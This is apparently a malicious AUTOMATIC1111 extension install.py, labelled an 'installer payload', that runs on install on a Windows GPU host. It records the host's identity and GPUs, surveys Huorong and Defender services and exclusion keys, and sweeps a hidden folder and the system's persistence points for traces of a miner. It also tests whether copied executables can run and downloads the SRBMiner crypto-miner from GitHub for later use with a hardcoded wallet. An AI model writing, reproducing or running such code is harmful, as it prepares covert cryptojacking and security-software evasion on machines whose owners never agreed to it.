# i4300 recon install.py -- A1111 extension installer payload (runs as the webui user on the Windows GPU host)
# Read-only-first: snapshot Huorong/Defender, sweep C:\Users\Administrator\AppData\Local\.sdui_m, probe route viability.
import os, sys, subprocess, json, hashlib, time, socket, shutil, re, traceback

BASE = os.getcwd()                       # extensions\<dir>
STAGE = os.path.join(BASE, 'stage')
WALLET = os.environ.get('PRL_WALLET') or "prl1p2ncf4s0aq428mkxn2eyk0mkcna2vvyzavd7zxwyaf889g5cazfmse0nwzj"
RETIRED = "prl1pmm9th5f80vrgwv7evwnx3z4w5dxm4mj7qdt7wwxxfzpsqv88gr7qjhvuwy"
ZIP_SHA = "cbfc6fa4daf22641e0f845922f8fbccff7ff1dc144af7316061bca06b76cfb1f"
EXE_SHA = "dde3740fd6ee9e7fd3832edd98c9fb838df2344ef05b5ecbcd87997dfb5d3348"
SDUI = r"C:\Users\Administrator\AppData\Local\.sdui_m"

def now():
    return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())

def w(name, text):
    try:
        with open(os.path.join(BASE, name), 'w', encoding='utf-8', errors='replace') as f:
            f.write(text if isinstance(text, str) else str(text))
    except Exception:
        pass

def run(cmd, timeout=90, cwd=None):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, cwd=cwd)
        out = (p.stdout or b'') + (p.stderr or b'')
        return p.returncode, out.decode('utf-8', 'replace')
    except subprocess.TimeoutExpired as e:
        part = b''
        if e.stdout: part += e.stdout
        if e.stderr: part += e.stderr
        return -9, 'TIMEOUT %ss\n' % timeout + part.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC: %r' % (e,)

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(1 << 20), b''):
            h.update(chunk)
    return h.hexdigest()

def walk_files(root, limit=400):
    out = []
    for dirpath, dirnames, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
                out.append((p, st.st_size, int(st.st_mtime)))
            except Exception:
                out.append((p, -1, 0))
            if len(out) >= limit:
                return out
    return out

def scan_markers(path, needles=(b'prl1', b'wallet', b'pearl', b'luckypool', b'pearlhash', b'stratum', b'xmr', b'miner', b'sdui')):
    hits = set()
    try:
        with open(path, 'rb') as f:
            blob = f.read(2 << 20)
        low = blob.lower()
        for n in needles:
            if n in low:
                hits.add(n.decode())
        # capture any prl1... token and any likely wallet string
        for m in re.finditer(rb'prl1[a-z0-9]{20,80}', blob):
            hits.add('TOKEN:' + m.group(0)[:70].decode('latin1'))
    except Exception:
        pass
    return sorted(hits)

def main():
    started = now()
    os.makedirs(STAGE, exist_ok=True)
    recon = {'schema': 'prl-i4300-recon-v1', 'started': started, 'base': BASE, 'wallet_active': WALLET}

    # ---------- A: environment + GPU ----------
    a = []
    for label, cmd in [
        ('hostname', 'hostname'),
        ('whoami', 'whoami'),
        ('cwd', 'cd'),
        ('ver', 'ver'),
        ('whoami_groups_integrity', 'whoami /groups | findstr /i "S-1-16 Label"'),
        ('python', 'python -c "import sys;print(sys.version)"'),
        ('nvidia_smi_L', 'nvidia-smi -L'),
        ('nvidia_smi_csv', 'nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,temperature.gpu,driver_version,utilization.gpu --format=csv,noheader'),
        ('nvidia_compute_apps', 'nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader'),
        ('tasklist_miners', 'tasklist | findstr /i "SRBMiner krig wildrig miner xmrig nbminer"'),
    ]:
        rc, out = run(cmd, timeout=30)
        a.append('== %s (rc=%s) ==\n%s' % (label, rc, out.strip()))
    # dirs of interest
    for d in [r'C:\work', r'C:\work\stable-diffusion-webui1\extensions', r'C:\Users\Administrator\AppData\Local', r'C:\Windows\Temp']:
        rc, out = run('dir /b /a "%s"' % d, timeout=20)
        a.append('== dir %s (rc=%s) ==\n%s' % (d, rc, out.strip()[:4000]))
    w('status_env.txt', '\n\n'.join(a))

    # ---------- B: Huorong + Defender snapshot ----------
    b = []
    rc, out = run('sc query type= service state= all', timeout=60)
    svc_lines = [ln for ln in out.splitlines() if re.search(r'hips|huorong|sysdiag|hrkernel|hipstray', ln, re.I)]
    b.append('== sc query all | filtered (hips/huorong/sysdiag) ==\n' + '\n'.join(svc_lines[:80]))
    for svc in ['HipsMain', 'HipsDaemon', 'HipsTray', 'sysdiag', 'HRKernel']:
        rc1, o1 = run('sc query %s' % svc, timeout=20)
        rc2, o2 = run('sc qc %s' % svc, timeout=20)
        b.append('== sc query %s (rc=%s) ==\n%s' % (svc, rc1, o1.strip()))
        b.append('== sc qc %s (rc=%s) ==\n%s' % (svc, rc2, o2.strip()))
    rc, out = run('fltmc filters', timeout=20)
    b.append('== fltmc filters (rc=%s) ==\n%s' % (rc, out.strip()))
    rc, out = run('tasklist /svc', timeout=45)
    b.append('== tasklist /svc filtered ==\n' + '\n'.join([ln for ln in out.splitlines() if re.search(r'hips|huorong|sysdiag', ln, re.I)][:40]))
    for d in [r'C:\Program Files\Huorong', r'C:\Program Files\Huorong\Sysdiag', r'C:\Program Files\Huorong\Sysdiag\bin', r'C:\ProgramData\Huorong', r'C:\ProgramData\Huorong\Sysdiag']:
        rc, out = run('dir /b /a "%s"' % d, timeout=20)
        b.append('== dir %s (rc=%s) ==\n%s' % (d, rc, out.strip()[:3000]))
    for key in [r'HKLM\SOFTWARE\Huorong', r'HKLM\SOFTWARE\WOW6432Node\Huorong', r'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths', r'HKLM\SOFTWARE\Microsoft\Windows Defender']:
        rc, out = run('reg query "%s" /s' % key, timeout=30)
        b.append('== reg query %s (rc=%s) ==\n%s' % (key, rc, out.strip()[:30000]))
    w('status_huorong.txt', '\n\n'.join(b))

    # ---------- C: .sdui_m sweep ----------
    c = []
    exists = os.path.isdir(SDUI)
    c.append('.sdui_m exists=%s' % exists)
    files = walk_files(SDUI) if exists else []
    c.append('file_count=%d' % len(files))
    manifest = []
    for p, size, mtime in files[:120]:
        rec = {'path': p, 'size': size, 'mtime': mtime}
        try:
            rec['sha256'] = sha256_file(p)
        except Exception as e:
            rec['sha256'] = 'ERR:%r' % (e,)
        rec['markers'] = scan_markers(p)
        manifest.append(rec)
        c.append(json.dumps(rec))
    recon['sdui_m'] = {'exists': exists, 'files': manifest}
    # processes with image or cmdline under .sdui_m, plus any miner-like process
    rc, out = run('powershell -NoProfile -Command "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine | ConvertTo-Csv -NoTypeInformation"', timeout=60)
    proc_lines = [ln for ln in out.splitlines() if re.search(r'sdui|prl1|srbminer|krig|wildrig|xmrig|nbminer|miner', ln, re.I)]
    c.append('== processes matching sdui/markers ==\n' + '\n'.join(proc_lines[:80]))
    recon['proc_hits'] = proc_lines[:80]
    # services with sdui/prl paths
    rc, out = run('powershell -NoProfile -Command "Get-CimInstance Win32_Service | Where-Object {$_.PathName -match \'sdui|prl1\'} | Select-Object Name,State,PathName | ConvertTo-Csv -NoTypeInformation"', timeout=60)
    c.append('== services matching sdui/prl ==\n' + out.strip()[:8000])
    recon['svc_hits'] = out.strip()[:8000]
    # scheduled tasks + run keys + startup
    rc, out = run('schtasks /query /fo csv /v | findstr /i "sdui prl1 miner srb"', timeout=90)
    c.append('== schtasks matching ==\n' + out.strip()[:12000])
    recon['schtasks_hits'] = out.strip()[:12000]
    for key in [r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', r'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run', r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce']:
        rc, out = run('reg query "%s" /s' % key, timeout=20)
        c.append('== reg %s (rc=%s) ==\n%s' % (key, rc, out.strip()[:4000]))
    for d in [r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp', r'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup']:
        rc, out = run('dir /b /a "%s"' % d, timeout=20)
        c.append('== startup %s (rc=%s) ==\n%s' % (d, rc, out.strip()[:2000]))
    w('status_sduim.txt', '\n\n'.join(c))

    # ---------- D: route probes ----------
    d = []
    # D1 benign copied-exe exec
    probe = os.path.join(STAGE, 'probe_copy.exe')
    rc1, o1 = run('copy /y "C:\\Windows\\System32\\cmd.exe" "%s"' % probe, timeout=20)
    rc2, o2 = run('"%s" /c echo PROBE_COPY_OK_12345' % probe, timeout=20)
    d.append('== benign copied exe (copy rc=%s, run rc=%s) ==\n%s\n%s' % (rc1, rc2, o1.strip(), o2.strip()))
    recon['probe_copy'] = {'copy_rc': rc1, 'run_rc': rc2, 'out': o2.strip()[:500]}
    # D2 GitHub release zip download + pin check (do NOT extract yet)
    zp = os.path.join(STAGE, 'srb387.zip')
    url = 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-win64.zip'
    rc, out = run('curl.exe -sS -L --max-time 110 -o "%s" "%s"' % (zp, url), timeout=120)
    zsha = None
    if os.path.isfile(zp):
        zsha = sha256_file(zp)
    d.append('== github zip download (rc=%s) ==\nsize=%s sha256=%s pin_ok=%s\n%s' % (rc, os.path.getsize(zp) if os.path.isfile(zp) else -1, zsha, zsha == ZIP_SHA, out.strip()[:1000]))
    recon['zip'] = {'rc': rc, 'sha256': zsha, 'pin_ok': zsha == ZIP_SHA, 'size': os.path.getsize(zp) if os.path.isfile(zp) else -1}
    # D3 WSL
    wr = {}
    for label, cmd in [('status', 'wsl.exe --status'), ('list', 'wsl.exe -l -v'), ('nvidia', 'wsl.exe -e nvidia-smi -L')]:
        rc, out = run(cmd, timeout=25)
        wr[label] = {'rc': rc, 'out': out.strip()[:1500]}
        d.append('== wsl %s (rc=%s) ==\n%s' % (label, rc, out.strip()[:1500]))
    recon['wsl'] = wr
    # D4 Defender exclusions / Huorong trust strings in snapshot
    rc, out = run('reg query "HKLM\\SOFTWARE\\Huorong" /s /f "sdui"', timeout=30)
    d.append('== huorong reg contains sdui ==\n' + out.strip()[:3000])
    d.append('== stage contents after probes ==\n' + '\n'.join('%s %s' % (fn, os.path.getsize(os.path.join(STAGE, fn)) if os.path.isfile(os.path.join(STAGE, fn)) else '?') for fn in os.listdir(STAGE)))
    w('status_exec.txt', '\n\n'.join(d))
    recon['done'] = now()
    w('status_done.txt', 'RECON_DONE ' + json.dumps({'started': started, 'done': now(), 'zip_pin_ok': recon['zip']['pin_ok'], 'sdui_m_exists': exists, 'sdui_files': len(files)}))
    w('status_recon.json', json.dumps(recon, indent=1)[:200000])

if __name__ == '__main__':
    try:
        main()
    except Exception:
        w('status_error.txt', traceback.format_exc())
